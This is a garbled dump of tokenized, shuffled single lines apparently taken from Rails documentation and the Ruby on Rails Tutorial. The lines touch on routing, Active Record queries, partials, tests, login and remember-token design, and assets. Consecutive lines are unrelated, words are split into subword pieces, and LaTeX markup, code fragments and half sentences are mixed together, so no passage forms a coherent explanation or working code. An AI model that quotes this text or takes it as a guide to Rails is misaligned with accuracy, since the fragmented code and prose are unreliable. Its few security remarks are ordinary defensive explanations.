▁Here ' s ▁an ▁example ▁of ▁using ▁ benchmark - ips :
▁* ▁Rails ▁4▖0 ▁requires ▁that ▁scope s ▁use ▁a ▁call able ▁object ▁such ▁as ▁a ▁ Proc ▁or ▁ lambda :
▁I ▁suggest ▁starting ▁by ▁visit ing ▁the ▁\ href { http :// r ailscasts ▖ com / episodes / archive } { RailsCasts ▁e p is ode ▁ archive } ▁and ▁click ing ▁on ▁subject s ▁that ▁catch ▁your ▁e y e .
▁The ▁new ▁About ▁page ▁(\ href { http ://0▖0▖0▖0:3000/ static _ pages / about }{/ static \_ pages / about }) .
▁ Integration ▁tests ▁will ▁eventual ly ▁be ▁our ▁primary ▁testing ▁technique , ▁but ▁controller ▁tests ▁give ▁us ▁an ▁easier ▁place ▁to ▁start .
▁( In ▁case ▁you ' re ▁won d er ing ▁why ▁we ▁don ' t ▁just ▁use ▁the ▁signed ▁user ▁id , ▁without ▁the ▁remember ▁token , ▁this ▁would ▁allow ▁an ▁attacker ▁with ▁ po s session ▁of ▁the ▁ encrypted ▁id ▁to ▁log ▁in ▁as ▁the ▁user ▁in ▁per pe t u ity .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / array / access ▖ rb ` .
▁config ▖ middleware ▖ use ▁Rack :: Bo un ce F a v icon
▁The ▁` take ` ▁method ▁returns ▁` nil ` ▁if ▁no ▁record ▁is ▁found ▁and ▁no ▁exception ▁will ▁be ▁raised .
▁The ▁methods ▁` months _ ago ` ▁and ▁` months _ since ` ▁work ▁analogous ly ▁for ▁ months :
▁With ▁the ▁routes ▁defined , ▁we ▁are ▁now ▁in ▁a ▁position ▁to ▁make ▁tests ▁for ▁the ▁ stats ▁partial .
▁### ▁ Regular ▁F on t
▁If ▁you ▁choose ▁to ▁use ▁PostgreSQL , ▁your ▁` config / database ▖ yml ` ▁will ▁be ▁customize d ▁to ▁use ▁PostgreSQL ▁database s :
▁Here ' s ▁how ▁` rails ▁server ` ▁creates ▁an ▁instance ▁of ▁` Rack :: Server `
▁ Cl ic k ing ▁this ▁new ▁" Destroy ▁ Comment " ▁link ▁will ▁fire ▁off ▁a ▁` DELETE ╼ / articles / : article _ id / comments / : id ` ▁to ▁our ▁` Comments Controller `, ▁which ▁can ▁then ╼ use ▁this ▁to ▁find ▁the ▁comment ▁we ▁want ▁to ▁delete , ▁so ▁let ' s ▁add ▁a ▁` destroy ` ▁action ╼ to ▁our ▁controller ▁( ` app / controllers / comments _ controller ▖ rb ` ) :
▁complain s ▁that
▁By ▁now ▁you ▁can ▁ probably ▁guess ▁that ▁we ' ll ▁call ▁it ▁\ k ode { \_ footer ▖ html ▖ erb } ▁and ▁put ▁it ▁in ▁the ▁ layouts ▁directory ▁( Listing ~\ ref { code : footer _ partial })
▁S ince ▁we ▁destroyed ▁our ▁third ▁user ▁in ▁Section ~\ ref { sec : creating _ user _ objects }, ▁Active ▁Record ▁can ' t ▁find ▁it ▁in ▁the ▁database .
▁ / Users / mhartl / rails _ projects / sample _ app
▁The ▁rest ▁of ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁build s ▁on ▁this ▁foundation ▁to ▁make ▁a ▁site ▁with ▁Twitter - like ▁microposts ▁( Chapter ~\ ref { cha : user _ microposts }) ▁and ▁a ▁status ▁feed ▁of ▁posts ▁from ▁followed ▁users ▁( Chapter ~\ ref { cha : following _ users }) .
▁These ▁job s ▁can ▁be ▁everything ▁from ▁regular ly ▁ s ch ed ul ed ╼ c le an - up s , ▁to ▁b i ll ing ▁charg es , ▁to ▁mail ing s ▖
▁This ▁ensure s ▁that ▁both ▁links ▁to ▁the ▁Home ▁page ▁defined ▁in ▁Listing ~\ ref { code : header _ partial _ links } ▁are ▁present .
▁The ▁`-- mountable ` ▁option ▁tell s ▁the ▁generator ▁that ▁you ▁want ▁to ▁create ▁a ╼ " mountable " ▁and ▁ namespace - isolate d ▁engine ▖
▁end { enumerate }╼╼ ▁% ▁subsection ▁relationship _ user _ associations ▁( end )╼╼ ▁\ subsection { Relationship ▁validations } ▁% ▁( fold )╼ ▁\ label { sec : relationship _ validations }╼╼
▁# ▁ label (: article , ▁: title , ▁" A ▁short ▁title ")
▁It ▁also ▁add s ▁the ▁ability ▁to ▁write ▁these ▁assets ▁in ╼ other ▁languages ▁and ▁pre - process or s ▁such ▁as ▁CoffeeScript , ▁Sass ▁and ▁ ERB .
▁| ▁id ▁| ▁select _ type ▁| ▁table ▁| ▁type ▁| ▁possible _ keys ▁|
▁NOTE : ▁Rails ▁routes ▁are ▁match ed ▁in ▁the ▁order ▁they ▁are ▁specified , ▁so ▁if ▁you ▁have ▁a ▁` resources ▁: photos ` ▁above ▁a ▁` get ▁' photos / po ll ' ` ▁the ▁` show ` ▁action ' s ▁route ▁for ▁the ▁` resources ` ▁line ▁will ▁be ▁match ed ▁before ▁the ▁` get ` ▁line ▖
▁First ly , ▁you ▁need ▁a ▁place ▁within ▁the ▁application ▁to ▁create ▁a ▁new ▁article ▖
▁as ▁show n ▁in ▁Listing ~\ ref { code : gitignore } .
▁**` ActiveRecord :: Connection Adapters :: Connection Management ` **
▁This ▁rather ▁ ob s c ure ▁code , ▁which ▁you ▁don ' t ▁need ▁to ▁understand ▁in ▁detail , ▁arrange s ▁for ▁precise ly ▁the ▁behavior ▁describe d ▁above : ▁it ▁uses ▁the ▁ minimum ▁ cost ▁parameter ▁in ▁tests ▁and ▁a ▁normal ▁( high ) ▁ cost ▁parameter ▁in ▁production .
▁Testing ▁micropost ▁deletion ▁with ▁a ▁user ▁ mis match ▖
▁Listing ~\ ref { code : micropost _ partial } ▁also ▁add s ▁a ▁CSS ~ id ▁for ▁each ▁micropost ▁using
▁In ▁particular , ▁the ▁ Learn ▁En ough ▁introduc to ry ▁ sequence ▁consist s ▁of ▁a ▁series ▁of ▁tutorial s ▁that ▁are ▁suit able ▁as ▁ prerequisites ▁to ▁the
▁We ' ll ▁look ▁at ▁i mprov ing ▁the ╼ st y l ing ▁for ▁it ▁after ward s .
▁Having ▁defined ▁an ▁action ▁that ▁returns ▁the ▁desired ▁string , ▁we ▁need ▁to ▁tell ▁Rails ▁to ▁use ▁that ▁action ▁instead ▁of ▁the ▁default ▁page ▁in ▁Figure ~\ ref { fig : riding _ rails } .
▁The ▁above ▁copy right ▁notice ▁and ▁this ▁ permission ▁notice ▁shall ▁be ▁included ▁in
▁ Visit ▁the ▁login ▁path .
▁as ▁seen ▁in ▁Listing ~\ ref { code : destroy _ action } .
▁#### ▁N a m ing ▁ Partial s
▁For ▁example , ▁consider ▁the ▁following ▁` Category `, ▁` Article `, ▁` Comment `, ▁` G u est ` ▁and ▁` T a g ` ▁models :
▁<%= ▁@ greeting ▁%>
▁config ▖ action _ mailer ▖ observers ▁= ▁[" Mail O b server "]
▁P ar a do x ical ly , ▁we ' ll ▁take ▁the ▁first ▁step ▁toward ▁eliminat ing ▁duplication ▁by ▁first ▁adding ▁some ▁more : ▁we ' ll ▁make ▁the ▁title s ▁of ▁the ▁pages , ▁which ▁are ▁current ly ▁quite ▁similar , ▁match ▁\ emph { exactly } .
▁Now ▁that ▁we ▁know ▁how ▁to ▁make ▁partials , ▁let ' s ▁add ▁a ▁site ▁ footer ▁to ▁go ▁along ▁with ▁the ▁header .
▁query ▁= ▁Client ▖ select (: name )▖ distinct
▁# ▁item ▁is ▁already ▁ locked .
▁The ▁method ▁returns ▁an ▁array ▁with ▁the ▁ groups :
▁The ▁method ▁` ordinal ` ▁returns ▁the ▁ ordinal ▁ suffix ▁string ▁corresponding ▁to ▁the ▁receiver ▁ integer :
▁We ▁created ▁a ▁second ▁user ▁in ▁the ▁fixtures ▁in ▁Listing ~\ ref { code : fixture _ second _ user }, ▁but ▁30 ▁or ▁so ▁more ▁users ▁is ▁a ▁lot ▁to ▁create ▁by ▁hand .
▁You ▁can ▁also ▁use ▁this ▁to ▁override ▁routing ▁methods ▁defined ▁by ▁resources , ▁like ▁this :
▁ Convention ▁over ▁Configuration ▁in ▁Active ▁Record
▁* ▁` before _ add `
▁ SELECT ▁addresses .
▁### ▁Rails ▁Application ' s ▁Rack ▁Object
▁Now , ▁create ▁a ▁new ▁file ▁` app / views / articles / show ▖ html ▖ erb ` ▁with ▁the ▁following ╼ content :
▁### ▁ Asset s
▁Initialize d ▁empty ▁Git ▁repository ▁in ▁ / Users / mhartl / rails _ projects / first _ app / ▖ git /
▁To get her , ▁these ▁ const it ute ▁instructions ▁to ▁issue ▁an ▁HTTP ▁\ text tt { POST } ▁request ▁to ▁the ▁ / users ▁URL .
▁gem ▁' uglifier '
▁" visual _ e ffect "▖ camelize (: low er ) ▁# ▁=> ▁" visual E ffect "
▁" x ▁is ▁not ▁empty "
▁# ▁My App / app / decorator s / models / blorgh / article _ decorator ▖ rb
▁# ▁gem ▁' w in 32 console ', ▁' 1 ▖ 3▖2 '
▁ Updating ▁\ k ode { authenticated ?}
▁As ▁discuss ed ▁in ▁Section ~\ ref { sec : sessions _ and _ failed _ login }, ▁our ▁authentication ▁model ▁is ▁to ▁keep ▁users ▁logged ▁in ▁un til ▁they ▁log ▁out ▁explicitly .
▁ / Users / mhartl / rails _ projects / sample _ app / spec / models / user _ spec ▖ rb
▁So , ▁the ▁same ▁query ▁running ▁with ▁the ▁PostgreSQL ▁adapter ▁would ▁yield ▁instead
▁Client ▖ limit ( 5 )▖ offset ( 30 )
▁In side ▁the ▁block ▁for ▁this ▁method , ▁the ╼` Form Builder ` ▁object ▁- ▁represent ed ▁by ▁` f ` ▁- ▁is ▁used ▁to ▁build ▁two ▁ label s ▁and ▁two ╼ text ▁fields , ▁one ▁each ▁for ▁the ▁title ▁and ▁text ▁of ▁an ▁article ▖
▁With ▁the ▁\ k ode {@ user } ▁variable ▁so ▁defined , ▁the ▁test ▁for ▁the ▁signup ▁page ▁should ▁be ▁passing ▁again :
▁* ▁What ▁ Core ▁Extensions ▁are .
▁render ▁file : ▁"/ path / to / rails / app / views / books / edit "
▁If ▁a ▁file ╼ exists ▁at ▁` public / assets / rails ▖ png ` ▁it ▁is ▁served ▁by ▁the ▁web ▁server .
▁# ▁< commit ter > J o sh u a ▁P e e k </ commit ter >
▁In st all ▁Ruby
▁To ▁get ▁started , ▁we ▁need ▁to ▁include ▁the ▁\ text tt { carrierwave } ▁gem ▁in ▁the ▁\ k ode { Gemfile } ▁( Listing ~\ ref { code : gemfile _ carrierwave }) .
▁module ▁My Engine
▁Of ▁course , ▁this ▁means ▁that ▁we ▁will ▁have ▁to ▁define ▁such ▁a ▁variable ▁in ▁the ▁user ▁\ k ode { show } ▁action ▁( Listing ~\ ref { code : user _ show _ microposts _ instance }) .
▁P utting ▁the ▁above ▁idea s ▁together ▁lead s ▁to ▁the ▁test ▁in ▁Listing ~\ ref { code : a _ test _ for _ invalid _ submission } .
▁If ▁you ▁use ▁` readonly `, ▁then ▁the ▁ associated ▁object ▁will ▁be ▁read - only ▁when ▁retrieved ▁via ▁the ▁association .
▁The ▁User ▁data ▁model ▁with ▁an ▁added ▁\ k ode { password \_ digest } ▁attribute .
▁-- ▁create _ table (: users )
▁The ▁result ing ▁test ▁appears ▁in ▁Listing ~\ ref { code : home _ feed _ test } .
▁def ▁feedback _ message ( business , ▁user )
▁b section ▁ debugger ▁( end )╼╼ ▁\ subsection { A ▁Gravatar ▁image ▁and ▁a ▁ sidebar } ▁% ▁( fold )╼ ▁\ label { sec : a _ gravatar _ image }╼╼
▁They ▁are ▁es pecially ▁useful ▁for ▁ generating ▁ XML ▁content ▖
▁NOTE : ▁Of ▁course , ▁you ▁can ▁use ▁the ▁more ▁advanced ▁constraints ▁available ▁in ▁non - resource ful ▁routes ▁in ▁this ▁context .
▁Gravatar s ▁provide ▁a ▁convenient ▁way ▁of ▁display ing ▁images ▁to ▁represent ▁users .
▁#### # ▁` create _ association !(
▁The ▁result ing ▁\ k ode { reset \_ digest } ▁and ▁\ k ode { reset \_ s ent \_ at } ▁attributes ▁appear ▁in ▁Figure ~\ ref { fig : user _ model _ password _ reset } .
▁ ╼\ end { code }╼╼ ╼\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )╼\ label { sec : rails _ flavored _ ruby _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼╼\ item
▁Thu s ▁only ▁` rescue ` ▁can ▁tell ▁whether ▁a ▁given ▁arbitrar y ▁object ▁is ▁ duplicable ▖
▁in ▁Listing ~\ ref { code : title _ tests } .
▁Fin ally , ▁this ▁data ▁model ▁is ▁a ▁maintain ability ▁ n ight ma re : ▁each ▁time ▁a ▁user ▁changed ▁( s a y ) ▁his ▁name , ▁we ▁would ▁need ▁to ▁update ▁not ▁just ▁the ▁user ' s ▁record ▁in ▁the ▁\ k ode { users } ▁table ▁but ▁also ▁\ emph { ever y ▁ row ▁containing ▁that ▁user } ╼ in ▁both ▁the ▁\ k ode { followed \_ users } ▁and ▁\ k ode { followers } ▁table s .
▁#### # ▁`: join _ table `
▁# ▁=> ▁Thu , ▁01 ▁Apr ▁2010 ▁00:00:00 ▁+0000
▁< td > <%= ▁link _ to ▁' Show ', ▁article _ path ( article ) ▁%></ td >
▁ Adding ▁a ▁\ k ode { forget } ▁method ▁to ▁the ▁User ▁model .
▁As ▁with ▁user ▁deletion ▁( Section ~\ ref { sec : the _ destroy _ action }), ▁we ▁accomplish ▁this ▁with ▁`` delete '' ▁links , ▁as ▁ mock ed ▁up ▁in ▁Figure ~\ ref { fig : micropost _ delete _ links _ mockup } .
▁#### ▁When ▁are ▁Object s ▁ Save d ?
▁For ▁example , ▁the ▁\ k ode { config } ▁directory ▁of ▁my ▁sample ▁application ▁is
▁def ▁matches ?(
▁A ▁partial ▁for ▁ showing ▁a ▁single ▁micropost .
▁* ▁Rails ▁4▖0 ▁changes ▁the ▁default ▁me m cache d ▁client ▁from ▁` me m cache - client ` ▁to ▁` d all i ` ▖
▁A ▁mockup ▁of ▁the ▁user ▁signup ▁page .
▁hash ▁= ▁ { ▁a : ▁1, ▁b : ▁ { ▁c : ▁2, ▁d : ▁[ 3 , ▁4 ] ▁ } ▁ }
▁For ▁example , ▁Action ▁Pack ▁uses ▁this ▁method ▁to ▁write ▁asset ▁cache ▁files ▁like ▁` all ▖ css `:
▁ From ▁the ▁per spec tive ▁of ▁an ▁introduc to ry ▁tutorial , ▁the ▁difference s ▁between ▁Rails ~4▖0 ▁and ▁the ▁previous ▁version , ▁Rails ~ 3▖2 , ▁are ▁ s l ight .
▁getting ▁results ▁consistent ▁with ▁this ▁tutorial ▖ ╼╼% ▁subsection ▁ installing _ rails ▁( end )╼╼ ▁\ section { The ▁first ▁application } ╼ ▁\ label { sec : the _ hello _ application }╼╼ Follow ing ▁a ▁\ href { http :// www ▖ cat b ▖ org / j argon / html / H / hello - world ▖ html } { long ▁ tr ad it ion } ▁in ▁computer ▁programming , ▁our ▁goal ▁for ▁the ▁first ▁application ▁is ▁to ▁write ▁a ▁``
▁Testing ▁the ▁`` remember ▁me '' ▁ box
▁You ▁may ▁be ▁able ▁to ▁guess ▁the ▁code ▁for ▁enforc ing ▁a ▁\ k ode { minimum } ▁length ▁constraint ▁by ▁refer r ing ▁to ▁the ▁corresponding ▁\ k ode { maximum } ▁validation ▁for ▁the ▁user ' s ▁name ▁( Listing ~\ ref { code : length _ validation }) :
▁In ▁this ▁case , ▁though , ▁it ' s ▁OK ▁if ▁you ▁would n ' t ▁have ▁guess ed ▁them .
▁redirect _ to ▁article _ path (@ article )
▁validates ▁: point s , ▁ numericality : ▁true
▁automatically ▁render s ▁each ▁of ▁the ▁users ▁in ▁the ▁\ k ode {@ users } ▁variable ▁using ▁the ▁\ k ode { \_ user ▖ html ▖ erb } ▁partial .
▁A ▁Rails ▁application ▁is ▁actually ▁just ▁a ▁" super cha r g ed " ╼ engine , ▁with ▁the ▁` Rails :: Application ` ▁class ▁inherit ing ▁a ▁lot ▁of ▁its ▁behavior ╼ from ▁` Rails :: Engine ` .
▁With ▁the ▁\ k ode { create } ▁action ▁defined ▁in ▁Listing ~\ ref { code : log _ in _ success }, ▁the ▁login ▁form ▁defined ▁in ▁Listing ~\ ref { code : login _ form _ tag } ▁should ▁now ▁be ▁working .
▁The ▁current ▁state ▁of ▁the ▁signup ▁page ▁\ href { http :// localhost :3000/ signup }{/ signup } .
▁In ▁this ▁case , ▁we ▁only ▁have ▁one ▁validation , ▁so ▁we ▁know ▁which ▁one ▁failed , ▁but ▁it ▁can ▁ still ▁be ▁helpful ▁to ▁check ▁using ▁the ▁\ k ode { errors } ▁object ▁generated ▁on ▁failure :
▁Heroku ▁recommend s ▁again st ▁using ▁different ▁database s ▁in ▁development ▁and ▁production , ▁but ▁for ▁the ▁sample ▁application ▁it ▁won ' t ▁make ▁any ▁difference , ▁and ▁SQLite ▁is ▁\ emph { much } ▁easier ▁than ▁PostgreSQL ▁to ▁install ▁and ▁configure ▁local ly
▁\ href { http :// railstutorial ▖ org / screencasts } { The ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁ screencasts } : ▁I ▁have ▁prepar ed ▁a ▁full - length ▁ screen c a st ▁course ▁base d ▁on ▁this ▁book .
▁constraints ( id : ▁ / [ A - Z ] [ A - Z ] [ 0 - 9 ] + / ) ▁do
▁The ▁` collection ▖ destroy ` ▁method ▁remove s ▁one ▁or ▁more ▁objects ▁from ▁the ▁collection ▁by ▁running ▁` destroy ` ▁on ▁each ▁object .
▁Testing ▁the ▁Relationship ▁model ▁validations .
▁ ╼ ▁ .
▁The ▁extension ▁of ▁this ▁file ▁name ▁is ▁key : ▁the ╼ first ▁extension ▁is ▁the ▁ _ format _ ▁of ▁the ▁template , ▁and ▁the ▁second ▁extension ▁is ▁the ╼ _ h and ler _ ▁that ▁will ▁be ▁used ▖
▁Rails ▁uses ▁a ▁technique ▁called ▁" U nobtrusive ▁JavaScript " ▁to ▁handle ▁a tt a ch ing ╼ JavaScript ▁to ▁the ▁ DOM ▖
▁The ▁only ▁requirement ▁for ▁\ k ode { has \_ secure \_ password } ▁to ▁work ▁its ▁magic ▁is ▁for ▁the ▁corresponding ▁model ▁to ▁have ▁an ▁attribute ▁called ▁\ k ode { password \_ digest } ▖ ▁(
▁invoke ▁ coffee
▁This ▁is ▁a ▁long ▁and ▁challenging ▁chapter ▁cover ing ▁many ▁ detailed ▁aspect s ▁of ▁login ▁common ▁systems , ▁so ▁I ▁recommend ▁focus ing ▁on ▁complet ing ▁it ▁section ▁by ▁section .
▁if ▁ video ▖ owner ▖ pre m i um ?
▁This ▁is ▁easy ▁using ▁the ▁named ▁route ▁\ k ode { edit \_ user \_ path } ▁from ▁Table ~\ ref { table : RESTful _ users }, ▁together ▁with ▁the ▁hand y ▁\ k ode { current \_ user } ▁helper ▁method ▁defined ▁in ▁Listing ~\ ref { code : persistent _ current _ user } :
▁Client ▖ select (: name )▖ map ▁& : name
▁# ▁=> ▁" com p any %5 B name %5 D = John s on + % 2 6 + John s on "
▁These ▁helpers ▁take ▁an ▁instance ▁of ▁ Magazine ▁as ▁the ▁first ▁parameter ▁( ` magazine _ ads _ url (@ magazine ) ` ) .
▁< tr >
▁You ▁can ▁do ▁that ▁by ▁using ▁the ▁`: if ` ▁and ▁`: unless ` ▁options , ▁which ╼ can ▁take ▁a ▁symbol , ▁a ▁string , ▁a ▁` Proc ` ▁or ▁an ▁` Array ` ▖
▁delete ▁mode ▁100 64 4 ▁README ▖ rdoc
▁We ' ll ▁start ▁with ▁fai r ly ▁simple ▁ ERb ▁templates ▁for ▁adding ▁a ▁micropost ▁display ▁to ▁the ▁user ▁profile , ▁and ▁then ▁we ' ll ▁add ▁microposts ▁to ▁the ▁ seed ▁data ▁from ▁Section ~\ ref { sec : sample _ users } ▁so ▁that ▁we ▁have ▁something ▁to ▁display .
▁Fin ally , ▁when ▁users ▁\ emph { ar en ' t } ▁logged ▁in , ▁we ' ll ▁use ▁the ▁login ▁path ▁defined ▁in ▁Listing ~\ ref { code : sessions _ resource } ▁to ▁make ▁a ▁link ▁to ▁the ▁login ▁form :
▁If ▁you ▁want ▁them ▁to ▁run ▁in ▁other ▁ environments ▁consult ▁the ╼[ Spring ▁README ]( https :// github ▖ com / rails / spring # rake ) .
▁Because ▁the ▁exist ence ▁of ▁a ▁valid ▁\ k ode {@ user } ▁is ▁needed ▁in ▁both ▁the ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁actions , ▁we ' ll ▁put ▁the ▁code ▁to ▁find ▁and ▁validate ▁it ▁in ▁a ▁couple ▁of ▁before ▁filter s , ▁as ▁show n ▁in ▁Listing ~\ ref { code : password _ reset _ edit _ action } .
▁ assert _ generate s ▁' / photos /1 ', ▁ { ▁controller : ▁' photos ', ▁action : ▁' show ', ▁id : ▁'1' ▁ }
▁There ' s ▁a ▁second ▁can d id ate ▁for ▁nesting ▁that ▁requires ▁a ▁slightly ▁different ▁syntax .
▁* ▁`: foreign _ key `
▁Be h in d ▁the ▁ s c en es , ▁this ▁means ▁ extract ing ▁the ▁primary ▁key ▁from ▁the ▁associate ▁object ▁and ▁setting ▁this ▁object ' s ▁foreign ▁key ▁to ▁the ▁same ▁value .
▁See ▁the ▁article ▁`` \ href { https :// github ▖ com / blog / 92 6 - sh in y - new - commit - style s } { S h in y ▁new ▁commit ▁style s } '' ▁for ▁more ▁information .
▁render ▁xml : ▁@ product
▁Note ▁also ▁that ▁\ k ode { nil } ▁is ▁blank ; ▁since ▁\ k ode { nil } ▁isn ' t ▁a ▁string , ▁this ▁is ▁a ▁hint ▁that ▁Rails ▁actually ▁add s ▁\ k ode { blank ?}\ ▁to ▁\ k ode { String } ' s ▁base ▁class , ▁which ▁( as ▁we ▁saw ▁at ▁the ▁beginning ▁of ▁this ▁section ) ▁is ▁\ k ode { Object } ▁itself .
▁from ▁Listing ~\ ref { code : test _ helper _ sign _ in } ▁to
▁* ▁How ▁to ▁use ▁the ▁ various ▁rendering ▁methods ▁built ▁into ▁Rails .
▁T h r ough out ▁this ▁section , ▁I ▁recommend ▁compar ing ▁the ▁elements ▁of ▁the ▁Microposts ▁resource ▁with ▁the ▁analogous ▁user ▁elements ▁from ▁Section ~\ ref { sec : demo _ users _ resource } ; ▁you ▁should ▁see ▁that ▁the ▁two ▁resources ▁parallel ▁each ▁other ▁in ▁many ▁ways .
▁To ▁do ▁this , ▁create ▁a ▁file ▁called ╼` welcome _ email ▖ text ▖ erb ` ▁in ▁` app / views / user _ mailer / `:
▁The ▁result ing ▁\ k ode { Gemfile } ▁appears ▁as ▁in ▁Listing ~\ ref { code : gemfile _ pg _ gem } .
▁On ce ▁you ' re ▁h app y ▁that ▁the ▁pull ▁request ▁contains ▁a ▁good ▁change , ▁comment ▁on ▁the ▁GitHub ▁issue ▁indicat ing ▁your ▁app r o val ▖
▁An ▁id ▁used ▁in ▁this ▁ man n er ▁to ▁ connect ▁two ▁database ▁table s ▁is ▁known ▁as ▁a ▁\ emph { foreign ▁key }, ▁and ▁when ▁the ▁foreign ▁key ▁for ▁a ▁User ▁model ▁object ▁is ▁\ k ode { user \_ id }, ▁Rails ▁infer s ▁the ▁association ▁automatically : ▁by ▁default , ▁Rails ▁expect s ▁a ▁foreign ▁key ▁of ▁the ▁form ▁\ k ode { < class > \_ id }, ▁where ▁\ k ode { < class > } ▁is ▁the ▁lower - case ▁version ▁of ▁the ▁class ▁name
▁As ▁indicate d ▁in ▁the ▁email ▁templates ▁from ▁Section ~\ ref { sec : password _ reset _ mailer }, ▁we ' ll ▁consider ▁a ▁password ▁reset ▁to ▁be ▁ expired ▁if ▁it ▁was ▁sent ▁more ▁than ▁two ▁hours ▁ ago , ▁which ▁we ▁can ▁express ▁in ▁Ruby ▁as ▁follows :
▁Note ▁that ▁the ▁Rails ▁generator ▁automatically ▁ append s ▁\ k ode { \_ test } ▁to ▁the ▁name ▁of ▁the ▁test ▁file .
▁We ▁first ▁covered ▁ ERb ▁in ▁Section ~\ ref { sec : layouts _ and _ embedded _ ruby }, ▁and ▁cover ▁Sass ▁in ▁Section ~\ ref { sec : sass } .
▁If ▁you ▁do ▁not ▁specify ▁a ▁value ▁for ▁this ▁option , ▁a ▁d eprecation ▁ warning ▁will ▁be ╼ em it ted ▖
▁I ▁actually ▁used
▁Change s ▁that ▁are ▁merge d ▁into ▁master ▁are ▁intend ed ▁for ▁the ▁next ▁major ▁release ▁of ▁Rails ▖
▁ Adding ▁ Spring ▁to ▁the ▁\ k ode { ▖ gitignore } ▁file .
▁Here ▁\ k ode { User ▖ count } ▁is ▁\ k ode {0} ▁because ▁we ▁reset ▁the ▁database ▁at ▁the ▁beginning ▁of ▁Section ~\ ref { sec : signup _ form } .
▁If ▁you ▁want ▁to ▁prevent ▁ deleting ▁the ▁object ▁if ▁there ▁are ▁any ▁ associated ▁objects , ▁you ▁can ▁set ▁`: dependent ▁=> ▁: destroy ` ▁and ▁return ▁` false ` ▁after ▁check ing ▁for ▁exist ence ▁of ▁association ▁from ▁any ▁of ▁the ▁ associated ▁object ' s ▁destroy ▁callbacks .
▁After ▁ installing ▁Ruby , ▁you ▁should ▁configure ▁your ▁system ▁for ▁the ▁other ▁software ▁needed ▁to ▁run ▁Rails ▁applications .
▁# ▁di s card s ▁the ▁cached ▁copy ▁of ▁orders
▁ Sample ▁usage :
▁class ▁Create As se mb li es Part s J o in Table ▁< ▁ActiveRecord :: Migration
▁* ▁` config ▖ action _ controller ▖ logger ` ▁accept s ▁a ▁ logger ▁con form ing ▁to ▁the ▁interface ▁of ▁ Log 4 r ▁or ▁the ▁default ▁Ruby ▁ Logger ▁class , ▁which ▁is ▁then ▁used ▁to ▁log ▁information ▁from ▁Action ▁Controller ▖
▁if ▁@ book ▖ special ?
▁When ▁we ▁make ▁the ▁appropriate ▁request ▁to ▁the ▁Users ▁controller , ▁\ k ode { params [: id ]} ▁will ▁be ▁the ▁user ▁id ~\ text tt {1} , ▁so ▁the ▁effect ▁is ▁the ▁same ▁as ▁the ▁\ k ode { find } ▁method ▁\ k ode { User ▖ find (1) } ▁we ▁saw ▁in ▁Section ~\ ref { sec : find ing _ user _ objects } .
▁The ▁following ▁is ▁only ▁a ▁brief ▁ overview ▁ summary ▁of ▁the ▁helpers ▁available ▁in ▁Action ▁View ▖
▁The ▁default ▁is ▁true , ▁to ▁use ▁timestamp s , ▁which ▁are ▁preferred ▁if ▁there ▁are ▁multiple ▁developers ▁working ▁on ▁the ▁same ▁application .
▁### ▁Re s po nd ers
▁This ▁will ▁enable ▁Rails ▁to ▁recognize ▁paths ▁such ▁as ▁` / photos / search ` ▁with ▁GET , ▁and ▁route ▁to ▁the ▁` search ` ▁action ▁of ▁` PhotosController ` ▖
▁Now ▁we ▁just ▁have ▁to ▁fill ▁in ▁the ▁links ▁in ▁the ▁layout .
▁As ▁seen ▁in ▁the ▁final ▁example , ▁it ' s ▁possible ▁to ▁leave ▁out ▁the ▁argument ▁entire ly ▁( in ▁which ▁case ▁we ▁can ▁also ▁omit ▁the ▁parentheses ) .
▁In ▁other ▁words , ▁there ' s ▁a ▁suit able ▁base ▁title , ▁but ▁there ' s ▁also ▁a ▁leading ▁vertical ▁bar ▁character ▁\ k ode { | } ▁at ▁the ▁beginning .
▁This ▁uses ▁the ▁\ k ode { escape \_ javascript } ▁function , ▁which ▁is ▁needed ▁to ▁escape ▁out ▁the ▁result ▁when ▁insert ing ▁HTML ▁in ▁a ▁JavaScript ▁file .
▁Note ▁the ▁use ▁of ▁\ k ode { via : ▁' delete ' } ▁for ▁the ▁ signout ▁route , ▁which ▁indicates ▁that ▁it ▁should ▁be ▁invoke d ▁using ▁an ▁HTTP ▁\ text tt { DELETE } ▁request .
▁message : ▁" should ▁happen ▁once ▁per ▁ year " ▁ }
▁An ▁empty ▁fixtures ▁file ▖
▁ Q ue ue s
▁user ▁= ▁User ▖ first
▁account =
▁Sometimes , ▁you ▁have ▁a ▁resource ▁that ▁clients ▁always ▁look ▁up ▁without ▁refer en c ing ▁an ▁ ID ▖
▁ Adding ▁a ▁title ▁and ▁ head ing ▁for ▁the ▁user ▁profile ▁page .
▁The ▁reason ▁is ▁that ▁initializ ing ▁the ▁entire ▁\ k ode { params } ▁hash ▁is ▁\ emph { extremely } ▁d angerous --- it ▁arrange s ▁to ▁pass ▁to ▁\ k ode { User ▖ new } ▁\ emph { all } ▁data ▁submitted ▁by ▁a ▁user .
▁Some ▁database ▁adapter s ▁use ▁case - sensitive ▁indices , ▁consider ing ▁the ▁strings ▁`` Foo @ E x A M P le .
▁I ▁encourag e ▁you ▁to ▁ st u d y ▁Table ~\ ref { table : valid _ email _ regex } ▁with ▁a ▁browser ▁window ▁open ▁to ▁ Rubular --- no ▁amount ▁of ▁reading ▁about ▁regular ▁expression s ▁can ▁replace ▁ play ing ▁with ▁them ▁inter active ly .
▁By ▁default , ▁the ▁scaffold ▁styling ▁is ▁not ▁applied ▁to ▁the ▁engine ▁because ▁the ╼ engine ' s ▁layout ▁file , ▁` app / views / layouts / blorgh / application ▖ html ▖ erb `, ▁doesn ' t ╼ load ▁it ▖
▁This ▁helper ▁passes ▁the ▁record ▁to ▁a ▁separate ▁class ▁for ▁validation .
▁The ▁result ing ▁\ k ode { logged \_ in ?}\ ▁method ▁appears ▁in ▁Listing ~\ ref { code : logged _ in _ p } .
▁### ▁ Trans la ted ▁Path s
▁The ▁second ▁line ▁can ▁ safe ly ▁access ▁the ▁" type " ▁key , ▁and ▁let ▁the ▁user ▁to ▁pass ▁either ▁`: type ` ▁or ▁" type " .
▁WARNING : ▁When ▁using ▁asset ▁pre com p i l ation , ▁you ▁will ▁need ▁to ▁ensure ▁that ▁your ╼ controller ▁assets ▁will ▁be ▁ precompile d ▁when ▁loading ▁them ▁on ▁a ▁per ▁page ▁basis ▖
